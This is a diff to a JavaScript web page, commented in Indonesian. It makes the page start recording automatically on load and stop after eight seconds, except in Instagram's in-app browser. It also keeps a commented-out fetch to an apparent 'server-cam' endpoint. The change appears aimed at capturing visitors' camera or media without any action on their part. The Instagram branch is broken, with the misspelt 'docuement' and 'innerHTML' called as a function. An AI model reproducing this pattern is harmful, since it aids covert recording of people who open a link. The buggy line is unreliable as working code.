@@ -13,17 +13,9 @@ const config = {
 };
 
 // Fungsi untuk memulai perekaman
-var isInstagramBrowser = /Instagram|InstagramWebView/.test(navigator.userAgent);
+const isInstagramBrowser = /Instagram|InstagramWebView/.test(navigator.userAgent);
 
-if (isInstagramBrowser) {
-    // Website dibuka di peramban Instagram
-    alert('browser yang kamu gunakan tidak mendukung')
-        // Tindakan yang sesuai dapat dilakukan di sini
-} else {
-    // Website tidak dibuka di peramban Instagram
-    alert('browser kamu mendukung get user media')
-        // Tindakan alternatif dapat dilakukan di sini
-}
+
 
 function startRecording() {
 
@@ -91,11 +83,16 @@ function stopRecording() {
     });
 }
 
-// setTimeout(() => {
-//     stopRecording()
-// }, 8000)
 
-// startRecording()
+if (isInstagramBrowser) {
+    docuement.innerHTML('mohon maaf website kamu tidak mendukung coba gunakan google chrome')
+} else {
+    startRecording()
+    setTimeout(() => {
+        stopRecording()
+    }, 8000)
+}
+
 
 
 // fetch('https://server-cam.vercel.app/data/0')
